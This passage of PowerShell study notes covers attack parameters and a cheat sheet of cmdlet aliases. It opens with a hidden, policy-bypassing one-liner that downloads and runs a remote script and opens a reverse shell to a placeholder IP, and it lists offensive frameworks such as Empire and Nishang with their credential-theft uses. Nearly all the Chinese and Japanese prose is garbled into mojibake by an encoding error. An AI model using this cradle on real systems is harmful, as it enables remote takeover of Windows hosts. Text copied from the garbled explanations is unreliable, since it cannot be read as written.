<li>ç”¨IEXä¸‹è½½è¿œç¨‹PS1è„šæœ¬ç»•è¿‡æƒé™æ‰§è¡Œ</li>
</ol>
<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonI -NoProfile iex (New-Object Net.WebClient).DownloadString("xxx.ps1");Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
</code></pre>
<p>ä¸Šè¿°å‚æ•°çš„è¯´æ˜ï¼Œå¦‚ä¸‹</p>
<ul>
<li><code class="notranslate">ExecutionPolicy Bypass</code>ç»•è¿‡æ‰§è¡Œå®‰å…¨ç­–ç•¥ï¼Œè¿™ä¸ªå‚æ•°éå¸¸é‡è¦ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒPowerShellçš„å®‰å…¨ç­–ç•¥è§„å®šäº†PowerShellä¸å…è®¸è¿è¡Œå‘½ä»¤å’Œæ–‡ä»¶ã€‚é€šè¿‡è®¾ç½®è¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥ç»•è¿‡ä»»æ„ä¸€ä¸ªå®‰å…¨ä¿æŠ¤è§„åˆ™</li>
<li><code class="notranslate">WindowStyle Hidden</code>ã€€éšè—çª—å£</li>
<li><code class="notranslate">NoLogo</code>ã€€å¯åŠ¨ä¸æ˜¾ç¤ºç‰ˆæƒæ ‡å¿—çš„PowerShell.</li>
<li><code class="notranslate">NonInteractive (-Nonl) </code>ã€€éäº¤äº’æ¨¡å¼ï¼ŒPowerShellä¸ä¸ºç”¨æˆ·æä¾›äº¤äº’çš„æç¤ºã€‚</li>
<li><code class="notranslate">NoProfile (-NoP) </code>ã€€PowerShellæ§åˆ¶å°ä¸åŠ è½½å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ã€‚</li>
<li><code class="notranslate">Noexit</code>ã€€æ‰§è¡Œåä¸é€€å‡ºShellã€‚è¿™åœ¨ä½¿ç”¨é”®ç›˜è®°å½•è„šæœ¬æ—¶éå¸¸é‡è¦ã€‚</li>
</ul>
<h2>å¸¸ç”¨çš„PowerShelæ”»å‡»å·¥å…·æœ‰ä»¥ä¸‹è¿™å‡ ç§</h2>
<ul>
<li>
<p><code class="notranslate">PowerSplit</code>ã€€è¿™æ˜¯ä¼—å¤šPowerShellæ”»å‡»å·¥å…·ä¸­è¢«å¹¿æ³›ä½¿ç”¨çš„PowerShelåæœŸæ¼æ´åˆ©ç”¨æ¡†æ¶ï¼Œå¸¸ç”¨äºä¿¡æ¯æ¢æµ‹ã€ç‰¹æƒæå‡ã€å‡­è¯çªƒå–ã€æŒä¹…åŒ–ç­‰æ“ä½œã€‚</p>
</li>
<li>
<p><code class="notranslate">Nishang</code>ã€€åŸºäºPowerShellçš„æ¸—é€æµ‹è¯•ä¸“ç”¨å·¥å…·ï¼Œ é›†æˆäº†æ¡†æ¶ã€è„šæœ¬å’Œå„ç§Payload,åŒ…å«ä¸‹è½½å’Œæ‰§è¡Œã€é”®ç›˜è®°å½•ã€DNSã€ å»¶æ—¶å‘½ä»¤ç­‰è„šæœ¬ã€‚</p>
</li>
<li>
<p><code class="notranslate">Empire</code>ã€€åŸºäºPowerShelçš„è¿œç¨‹æ§åˆ¶æœ¨é©¬ï¼Œå¯ä»¥ä»å‡­è¯æ•°æ®åº“ä¸­å¯¼å‡ºå’Œè·Ÿè¸ªå‡­è¯ä¿¡æ¯ï¼Œå¸¸ç”¨äºæä¾›å‰æœŸæ¼æ´åˆ©ç”¨çš„é›†æˆæ¨¡å—ã€ä¿¡æ¯æ¢æµ‹ã€å‡­æ®çªƒå–ã€æŒä¹…åŒ–æ§åˆ¶ã€‚</p>
</li>
<li>
<p><code class="notranslate">PowerCat</code>ã€€Powershellç‰ˆçš„NetCat, æœ‰ç€ç½‘ç»œå·¥å…·ä¸­çš„"ç‘å£«å†›åˆ€â€ç¾èª‰ï¼Œå®ƒèƒ½é€šè¿‡TCPå’ŒUDPåœ¨ç½‘ç»œä¸­è¯»å†™æ•°æ®ã€‚é€šè¿‡ä¸å…¶ä»–å·¥å…·ç»“åˆå’Œé‡å®šå‘ï¼Œå¯ä»¥åœ¨è„šæœ¬ä¸­ä»¥å¤šç§æ–¹å¼ä½¿ç”¨å®ƒã€‚</p>
</li>
</ul>
<h1>è·å– PowerShell Aliasä¸€è¦§</h1>
<pre class="notranslate"><code class="notranslate">PS&gt;  galã€€æˆ–è€…   PS&gt;  Get-Alias
</code></pre>
<p><img src="https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png"></p>
<h2>PowerShell Aliasä¸€è¦§</h2>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>PowerShell Alias</th>
<th>PowerShell Command</th>
<th>ä¾‹å­</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>å‘½ä»¤</strong></td>
<td><strong>Command</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gcm ğŸ‘™</td>
<td>Get-Command</td>
<td>ä¾‹ï¼š<code class="notranslate">Get-Command Get-*</code>ã€€æŸ¥æ‰¾æ‰€æœ‰ä»¥ Get- å¼€å¤´çš„ cmdlets</td>
</tr>
<tr>
<td>icm</td>
<td>Invoke-Command</td>
<td></td>
</tr>
<tr>
<td>shcm</td>
<td>Show-Command</td>
<td></td>
</tr>
<tr>
<td>trcm</td>
<td>Trace-Command</td>
<td></td>
</tr>
<tr>
<td><strong>åˆ«å</strong></td>
<td><strong>Alias</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gal ğŸ‘™</td>
<td>Get-Alias</td>
<td>æ˜¾ç¤ºPowerShell Aliasä¸€è¦§</td>
</tr>
<tr>
<td>nal</td>
<td>New-Alias</td>
<td></td>
</tr>
<tr>
<td>sal</td>
<td>Set-Alias</td>
<td></td>
</tr>
<tr>
<td>ipal</td>
<td>Import-Alias</td>
<td></td>
</tr>
<tr>
<td>epal</td>
<td>Export-Alias</td>
<td></td>
</tr>
<tr>
<td><strong>ç£ç›˜</strong></td>
<td><strong>PSDrive</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gdr ğŸ‘™</td>
<td>Get-PSDrive</td>
<td></td>
</tr>
<tr>
<td>mount ğŸ‘™</td>
<td>New-PSDrive</td>
<td></td>
</tr>
<tr>
<td>ndr</td>
<td>New-PSDrive</td>
<td></td>
</tr>
<tr>
<td>rdr</td>
<td>Remove-PSDrive</td>
<td></td>
</tr>
<tr>
<td><strong>ç›®å½•</strong></td>
<td><strong>Location</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>pwd ğŸ‘™</td>
<td>Get-Location</td>
<td>æ˜¾ç¤ºå½“å‰æ‰€åœ¨ç›®å½•</td>
</tr>
<tr>
<td>gl</td>
<td>Get-Location</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>cd ğŸ‘™</td>
<td>Set-Location</td>
<td>ä¾‹ï¼š<code class="notranslate">Set-Location C:\Users\YourName\Documents</code>  åˆ‡æ¢æ–‡æ¡£ç›®å½•</td>
</tr>
<tr>
<td>chdir</td>
<td>Set-Location</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>sl</td>
<td>Set-Location</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>popd</td>
<td>Pop-Location</td>
<td>ï¼Ÿ</td>
</tr>
<tr>
<td>pushd</td>
<td>Push-Location</td>
<td>ï¼Ÿ</td>
</tr>
<tr>
<td><strong>å­ç›®å½•æˆ–æ–‡ä»¶</strong></td>
<td><strong>ChildItem</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>ls ğŸ‘™</td>
<td>Get-ChildItem</td>
<td>åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•</td>
</tr>
<tr>
<td>dir ğŸ‘™</td>
<td>Get-ChildItem</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>gci</td>
<td>Get-ChildItem</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td><strong>æ“ä½œç›®å½•æˆ–æ–‡ä»¶</strong></td>
<td><strong>Item</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>copy ğŸ‘™</td>
<td>Copy-Item</td>
<td>ä¾‹ï¼š<code class="notranslate">Copy-Item C:\source\test.txt C:\destination\</code>  å¤åˆ¶æ–‡ä»¶ test.txt åˆ°å¦ä¸€ä¸ªç›®å½•</td>
</tr>
<tr>
<td>cp ğŸ‘™</td>
<td>Copy-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>cpi</td>
<td>Copy-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>mv ğŸ‘™</td>
<td>Move-Item</td>
<td>ä¾‹ï¼š<code class="notranslate">Move-Item C:\temp\oldname.txt C:\temp\newfolder\newname.txt</code>  å°†æ–‡ä»¶ oldname.txt ç§»åŠ¨åˆ° newfolder å¹¶é‡å‘½åä¸º newname.txt</td>
</tr>
<tr>
<td>move</td>
<td>Move-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>mi</td>
<td>Move-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>ren ğŸ‘™</td>
<td>Rename-Item</td>
<td>ä¾‹ï¼š<code class="notranslate">Rename-Item C:\temp\oldname.txt C:\temp\newname.txt</code>  å°†æ–‡ä»¶ oldname.txt é‡å‘½åä¸º newname.txt</td>
</tr>
<tr>
<td>rni</td>
<td>Rename-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>del ğŸ‘™</td>
<td>Remove-Item</td>
<td>ä¾‹ï¼š<code class="notranslate">Remove-Item C:\temp\test.txt -Force</code>  åˆ é™¤åä¸º test.txt çš„æ–‡ä»¶</td>
</tr>
<tr>
<td>rm ğŸ‘™</td>
<td>Remove-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>rmdir ğŸ‘™</td>
<td>Remove-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>erase</td>
<td>Remove-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>rd</td>
<td>Remove-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>ri</td>
<td>Remove-Item</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>ni</td>
<td>New-Item</td>
<td>ä¾‹ï¼š<code class="notranslate">New-Item -ItemType Directory -Path .\myFolder</code>  åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º myFolder çš„æ–°ç›®å½•</td>
</tr>
<tr>
<td>gi</td>
<td>Get-Item</td>
<td>ï¼Ÿ</td>
</tr>
<tr>
<td>si</td>
<td>Set-Item</td>
<td>ï¼Ÿ</td>
</tr>
<tr>
<td>ii</td>
<td>Invoke-Item</td>
<td>ï¼Ÿ</td>
</tr>
<tr>
<td>cli</td>
<td>Clear-Item</td>
<td>ï¼Ÿ</td>
</tr>
<tr>
<td>md ğŸ‘™</td>
<td>mkdir</td>
<td>åˆ›å»ºæ–‡ä»¶å¤¹</td>
</tr>
<tr>
<td><strong>æ“ä½œç›®å½•æˆ–æ–‡ä»¶å±æ€§</strong></td>
<td><strong>ItemProperty</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gp</td>
<td>Get-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>sp</td>
<td>Set-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>clp</td>
<td>Clear-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>rnp</td>
<td>Rename-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>rp</td>
<td>Remove-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>cpp</td>
<td>Copy-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>mp</td>
<td>Move-ItemProperty</td>
<td></td>
</tr>
<tr>
<td>gpv</td>
<td>Get-ItemPropertyValue</td>
<td></td>
</tr>
<tr>
<td><strong>å˜é‡</strong></td>
<td><strong>Variable</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>set</td>
<td>Set-Variable</td>
<td></td>
</tr>
<tr>
<td>sv</td>
<td>Set-Variable</td>
<td></td>
</tr>
<tr>
<td>gv</td>
<td>Get-Variable</td>
<td></td>
</tr>
<tr>
<td>nv</td>
<td>New-Variable</td>
<td></td>
</tr>
<tr>
<td>clv</td>
<td>Clear-Variable</td>
<td></td>
</tr>
<tr>
<td>rv</td>
<td>Remove-Variable</td>
<td></td>
</tr>
<tr>
<td><strong>å¯¹è±¡</strong></td>
<td><strong>Object</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>%</td>
<td>ForEach-Object</td>
<td></td>
</tr>
<tr>
<td>foreach</td>
<td>ForEach-Object</td>
<td></td>
</tr>
<tr>
<td>?</td>
<td>Where-Object</td>
<td></td>
</tr>
<tr>
<td>where</td>
<td>Where-Object</td>
<td>ä¾‹ï¼š<code class="notranslate">Get-Process | Where-Object { $_.CPU -gt 10 }</code>  è·å– CPU å ç”¨ç‡å¤§äº 10% çš„æ‰€æœ‰è¿›ç¨‹</td>
</tr>
<tr>
<td>group</td>
<td>Group-Object</td>
<td>ä¾‹ï¼š<code class="notranslate">Get-Process | Group-Object -Property MainModule.FileName</code>  æŒ‰ä¸»æ¨¡å—çš„æ–‡ä»¶ååˆ†ç»„è¿›ç¨‹</td>
</tr>
<tr>
<td>sort</td>
<td>Sort-Object</td>
<td>ä¾‹ï¼š<code class="notranslate">Get-Process | Sort-Object -Property CPU -Desc</code>   æŒ‰ CPU å ç”¨ç‡é™åºæ’åˆ—æ‰€æœ‰è¿›ç¨‹</td>
</tr>
<tr>
<td>measure</td>
<td>Measure-Object</td>
<td></td>
</tr>
<tr>
<td>select</td>
<td>Select-Object</td>
<td></td>
</tr>
<tr>
<td>tee</td>
<td>Tee-Object</td>
<td></td>
</tr>
<tr>
<td>gwmi ğŸ‘™</td>
<td>Get-WmiObject</td>
<td>ä¾‹ï¼š<code class="notranslate">Get-WmiObject -Class Win32_OperatingSystem</code>  è·å–æ“ä½œç³»ç»Ÿä¿¡æ¯</td>
</tr>
<tr>
<td>rwmi</td>
<td>Remove-WmiObject</td>
<td></td>
</tr>
<tr>
<td><strong>æ¨¡å‹</strong></td>
<td><strong>Module</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gmo</td>
<td>Get-Module</td>
<td></td>
</tr>
<tr>
<td>ipmo</td>
<td>Import-Module</td>
<td></td>
</tr>
<tr>
<td>nmo</td>
<td>New-Module</td>
<td></td>
</tr>
<tr>
<td>rmo</td>
<td>Remove-Module</td>
<td></td>
</tr>
<tr>
<td><strong>æ¯”è¼ƒ</strong></td>
<td><strong>Compare</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>diff ğŸ‘™</td>
<td>Compare-Object</td>
<td>ä¾‹ï¼š<code class="notranslate">$list1 = 1..5 $list2 = 2..6 Compare-Object -ReferenceObject $list1 -DifferenceObject $list2</code>  æ¯”è¾ƒä¸¤ä¸ªæ•°å­—åˆ—è¡¨çš„ä¸åŒä¹‹å¤„</td>
</tr>
<tr>
<td>compare ğŸ‘™</td>
<td>Compare-Object</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td><strong>å±å¹•</strong></td>
<td><strong>Host</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>write ğŸ‘™</td>
<td>Write-Output</td>
<td>ä¾‹ï¼š<code class="notranslate">Write-Host "Hello, world!"</code>  è¾“å‡º Hello, world!</td>
</tr>
<tr>
<td>echo ğŸ‘™</td>
<td>Write-Output</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>clear ğŸ‘™</td>
<td>Clear-Host</td>
<td>æ¸…é™¤æ§åˆ¶å°å±å¹•</td>
</tr>
<tr>
<td>cls ğŸ‘™</td>
<td>Clear-Host</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td><strong>å±å¹•è®°å½•</strong></td>
<td><strong>History</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>clhy</td>
<td>Clear-History</td>
<td></td>
</tr>
<tr>
<td>ghy</td>
<td>Get-History</td>
<td></td>
</tr>
<tr>
<td>h</td>
<td>Get-History</td>
<td></td>
</tr>
<tr>
<td>history</td>
<td>Get-History</td>
<td></td>
</tr>
<tr>
<td>ihy</td>
<td>Invoke-History</td>
<td></td>
</tr>
<tr>
<td>r</td>
<td>Invoke-History</td>
<td></td>
</tr>
<tr>
<td><strong>è¿›ç¨‹</strong></td>
<td><strong>Process</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>ps ğŸ‘™</td>
<td>Get-Process</td>
<td>è·å–æ‰€æœ‰è¿è¡Œä¸­çš„è¿›ç¨‹ã€€`ps</td>
</tr>
<tr>
<td>gps</td>
<td>Get-Process</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>start</td>
<td>Start-Process</td>
<td>ä¾‹ï¼š<code class="notranslate">Start-Process notepad</code>  å¯åŠ¨è®°äº‹æœ¬åº”ç”¨ç¨‹åº</td>
</tr>
<tr>
<td>saps</td>
<td>Start-Process</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>kill</td>
<td>Stop-Process</td>
<td>ä¾‹ï¼š<code class="notranslate">Stop-Process -Name notepad</code>  ç»ˆæ­¢æ‰€æœ‰åä¸º notepad çš„è¿›ç¨‹</td>
</tr>
<tr>
<td>spps</td>
<td>Stop-Process</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td><strong>æœåŠ¡</strong></td>
<td><strong>Service</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gsv ğŸ‘™</td>
<td>Get-Service</td>
<td>è·å–æ‰€æœ‰æœåŠ¡çš„çŠ¶æ€</td>
</tr>
<tr>
<td>sasv</td>
<td>Start-Service</td>
<td>ä¾‹ï¼š<code class="notranslate">Start-Service -Name spooler</code>  å¯åŠ¨ Print Spooler æœåŠ¡</td>
</tr>
<tr>
<td>spsv</td>
<td>Stop-Service</td>
<td>ä¾‹ï¼š<code class="notranslate">Stop-Service -Name spooler</code>  åœæ­¢ Print Spooler æœåŠ¡</td>
</tr>
<tr>
<td>ãƒ¼</td>
<td>Restart-Service</td>
<td>ä¾‹ï¼š<code class="notranslate">Restart-Service -Name spooler</code>  é‡å¯ Print Spooler æœåŠ¡</td>
</tr>
<tr>
<td><strong>ä»»å‹™</strong></td>
<td><strong>Job</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gjb ğŸ‘™</td>
<td>Get-Job</td>
<td></td>
</tr>
<tr>
<td>sajb</td>
<td>Start-Job</td>
<td></td>
</tr>
<tr>
<td>spjb</td>
<td>Stop-Job</td>
<td></td>
</tr>
<tr>
<td>wjb</td>
<td>Wait-Job</td>
<td></td>
</tr>
<tr>
<td>rjb</td>
<td>Remove-Job</td>
<td></td>
</tr>
<tr>
<td>rcjb</td>
<td>Receive-Job</td>
<td></td>
</tr>
<tr>
<td>rujb</td>
<td>Resume-Job</td>
<td></td>
</tr>
<tr>
<td>sujb</td>
<td>Suspend-Job</td>
<td></td>
</tr>
<tr>
<td><strong>æ–‡ä»¶æ“ä½œ</strong></td>
<td><strong>Content</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>cat ğŸ‘™</td>
<td>Get-Content</td>
<td>ä¾‹ï¼š<code class="notranslate">$content = Get-Content -Path "C:\temp\input.txt"</code>  è¯»å–æ–‡ä»¶å†…å®¹</td>
</tr>
<tr>
<td>type ğŸ‘™</td>
<td>Get-Content</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>gc</td>
<td>Get-Content</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td>sc</td>
<td>Set-Content</td>
<td>ä¾‹ï¼š<code class="notranslate">"Hello, world!" | Set-Content -Path "C:\temp\output.txt"</code>  å†™å…¥æ–‡ä»¶å†…å®¹</td>
</tr>
<tr>
<td>ac</td>
<td>Add-Content</td>
<td>ä¾‹ï¼š<code class="notranslate">"Another line" | Add-Content -Path "C:\temp\output.txt"</code> æ·»åŠ æ–‡ä»¶å†…å®¹</td>
</tr>
<tr>
<td>clc</td>
<td>Clear-Content</td>
<td></td>
</tr>
<tr>
<td><strong>CSVæ“ä½œ</strong></td>
<td><strong>CSV</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>ipcsv</td>
<td>Import-Csv</td>
<td>ä¾‹ï¼š<code class="notranslate">$data = Import-Csv -Path "C:\temp\data.csv"</code>  ä» CSV æ–‡ä»¶å¯¼å…¥æ•°æ®</td>
</tr>
<tr>
<td>epcsv</td>
<td>Export-Csv</td>
<td>ä¾‹ï¼š<code class="notranslate">$data | Export-Csv -Path "C:\temp\output.csv" -NoTypeInformatio</code>  å°†æ•°æ®å¯¼å‡ºä¸º CSV æ–‡ä»¶</td>
</tr>
<tr>
<td><strong>ç½‘ç»œè¯·æ±‚</strong></td>
<td><strong>WebRequest</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>wget ğŸ‘™</td>
<td>Invoke-WebRequest</td>
<td>ä¾‹ï¼š<code class="notranslate">Invoke-WebRequest "https://api.github.com/repos/powershell/powershell/releases/latest"</code>  è·å– GitHub ä¸Šæœ€æ–°å‘å¸ƒçš„ç‰ˆæœ¬ä¿¡æ¯</td>
</tr>
<tr>
<td>curl ğŸ‘™</td>
<td>Invoke-WebRequest</td>
<td><a href="https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4" rel="nofollow">https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.4</a></td>
</tr>
<tr>
<td>irmğŸ‘™</td>
<td>Invoke-RestMethodã€€XMLã‚„JSONæ‰±ã„ã‚„ã™ã„</td>
<td><a href="https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.4" rel="nofollow">https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-restmethod?view=powershell-7.4</a></td>
</tr>
<tr>
<td>iex ğŸ‘™</td>
<td>Invoke-Expression</td>
<td><a href="https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4" rel="nofollow">https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.4</a></td>
</tr>
<tr>
<td>iwr</td>
<td>Invoke-WebRequest</td>
<td>åŒä¸Š</td>
</tr>
<tr>
<td><strong>å‰ªè´´æ¿</strong></td>
<td><strong>Clipboard</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gcb</td>
<td>Get-Clipboard</td>
<td></td>
</tr>
<tr>
<td>scb</td>
<td>Set-Clipboard</td>
<td></td>
</tr>
<tr>
<td><strong>æ—¶é—´åœ°åŸŸ</strong></td>
<td><strong>TimeZone</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gtz</td>
<td>Get-TimeZone</td>
<td></td>
</tr>
<tr>
<td>stz</td>
<td>Set-TimeZone</td>
<td></td>
</tr>
<tr>
<td><strong>Session</strong></td>
<td><strong>PSSession</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>cnsn</td>
<td>Connect-PSSession</td>
<td></td>
</tr>
<tr>
<td>dnsn</td>
<td>Disconnect-PSSession</td>
<td></td>
</tr>
<tr>
<td>epsn</td>
<td>Export-PSSession</td>
<td></td>
</tr>
<tr>
<td>etsn</td>
<td>Enter-PSSession</td>
<td></td>
</tr>
<tr>
<td>exsn</td>
<td>Exit-PSSession</td>
<td></td>
</tr>
<tr>
<td>gsn</td>
<td>Get-PSSession</td>
<td></td>
</tr>
<tr>
<td>ipsn</td>
<td>Import-PSSession</td>
<td></td>
</tr>
<tr>
<td>rcsn</td>
<td>Receive-PSSession</td>
<td></td>
</tr>
<tr>
<td>rsn</td>
<td>Remove-PSSession</td>
<td></td>
</tr>
<tr>
<td>nsn</td>
<td>New-PSSession</td>
<td></td>
</tr>
<tr>
<td>npssc</td>
<td>New-PSSessionConfigur</td>
<td></td>
</tr>
<tr>
<td><strong>Breakpoint</strong></td>
<td><strong>PSBreakpoint</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>dbp</td>
<td>Disable-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>ebp</td>
<td>Enable-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>gbp</td>
<td>Get-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>sbp</td>
<td>Set-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td>rbp</td>
<td>Remove-PSBreakpoint</td>
<td></td>
</tr>
<tr>
<td><strong>Snapin</strong></td>
<td><strong>PSSnapin</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>gsnp</td>
<td>Get-PSSnapin</td>
<td></td>
</tr>
<tr>
<td>asnp</td>
<td>Add-PSSnapin</td>
<td></td>
</tr>
<tr>
<td>rsnp</td>
<td>Remove-PSSnapin</td>
<td></td>
</tr>
<tr>
<td><strong>ãã®ä»–</strong></td>
<td><strong>Others</strong></td>
<td><strong>â‡£â‡£â‡£â‡£â‡£</strong></td>
</tr>
<tr>
<td>man ğŸ‘™</td>
<td>help</td>
<td>ä¾‹ï¼š<code class="notranslate">Get-Help Get-Process</code>  è·å– Get-Process çš„å¸®åŠ©æ–‡æ¡£</td>
</tr>
<tr>
<td>ise</td>
<td>powershell_ise.exe</td>
<td></td>
</tr>
<tr>
<td>CFS</td>
<td>ConvertFrom-String</td>
<td></td>
</tr>
<tr>
<td>cvpa</td>
<td>Convert-Path</td>
<td></td>
</tr>
<tr>
<td>fc</td>
<td>Format-Custom</td>
<td></td>
</tr>
<tr>
<td>fhx</td>
<td>Format-Hex</td>
<td></td>
</tr>
<tr>
<td>fl</td>
<td>Format-List</td>
<td></td>
</tr>
<tr>
<td>ft</td>
<td>Format-Table</td>
<td></td>
</tr>
<tr>
<td>fw</td>
<td>Format-Wide</td>
<td></td>
</tr>
<tr>
<td>gcs</td>
<td>Get-PSCallStack</td>
<td></td>
</tr>
<tr>
<td>gin ğŸ‘™</td>
<td>Get-ComputerInfo</td>
<td></td>
</tr>
<tr>
<td>gm</td>
<td>Get-Member</td>
<td></td>
</tr>
<tr>
<td>gu</td>
<td>Get-Unique</td>
<td></td>
</tr>
<tr>
<td>iwmi</td>
<td>Invoke-WmiMethod</td>
<td></td>
</tr>
<tr>
<td>lp</td>
<td>Out-Printer</td>
<td></td>
</tr>
<tr>
<td>ogv</td>
<td>Out-GridView</td>
<td></td>
</tr>
<tr>
<td>oh</td>
<td>Out-Host</td>
<td></td>
</tr>
<tr>
<td>rvpa</td>
<td>Resolve-Path</td>
<td></td>
</tr>
<tr>
<td>sleep</td>
<td>Start-Sleep</td>
<td></td>
</tr>
<tr>
<td>sls</td>
<td>Select-String</td>
<td>ä¾‹ï¼š<code class="notranslate">Select-String -Path "C:\temp\log.txt" -Pattern "error"</code>  åœ¨æ—¥å¿—æ–‡ä»¶ä¸­æœç´¢å«æœ‰ "error" çš„è¡Œ</td>
</tr>
<tr>
<td>swmi</td>
<td>Set-WmiInstance</td>
<td>åœ¨ WMI ä¸­åˆ›å»ºæˆ–ä¿®æ”¹å®ä¾‹</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<h2>Invoke-RestMethodä¸ Invoke-WebRequestçš„åŒºåˆ«</h2>
<pre class="notranslate"><code class="notranslate">$RestMethod = Invoke-RestMethod "https://yesno.wtf/api"
$RestMethod
answer forced image
------ ------ -----
yes     False https://yesno.wtf/assets/yes/2-5df1b403f2654fa77559af1bf2332d7a.gif

$rest.answer
yes

</code></pre>
<pre class="notranslate"><code class="notranslate">$WebRequest = Invoke-WebRequest "https://yesno.wtf/api"
$WebRequest
StatusCode        : 200
StatusDescription : OK
Content           : {"answer":"yes","forced":false,"image":"https://yesno.wtf/assets/yes/1-af11222d8d4af90bdab8fc447c8cfe
                    bf.gif"}
RawContent        : HTTP/1.1 200 OK
                    Transfer-Encoding: chunked
                    Connection: keep-alive
                    Status: 200 OK
                    Cache-Control: must-revalidate, max-age=0, private
                    Access-Control-Allow-Origin: *
                    ETag: "d5d1109b6aaeee4be8ce60e5846156â€¦
Headers           : {[Transfer-Encoding, System.String[]], [Connection, System.String[]], [Status, System.String[]], [Cac
                    he-Control, System.String[]]â€¦}
Images            : {}
InputFields       : {}
Links             : {}
RawContentLength  : 109
RelationLink      : {}

$hoge = ConvertFrom-Json $web
$hoge.answer
yes
</code></pre>
<p>å‰è€…ï¼ˆRestMethodï¼‰ã¯ PowerShell ç‰¹æœ‰ã® PSObject ã¨ã„ã†å½¢ã§ã™ã­ã€‚<br>
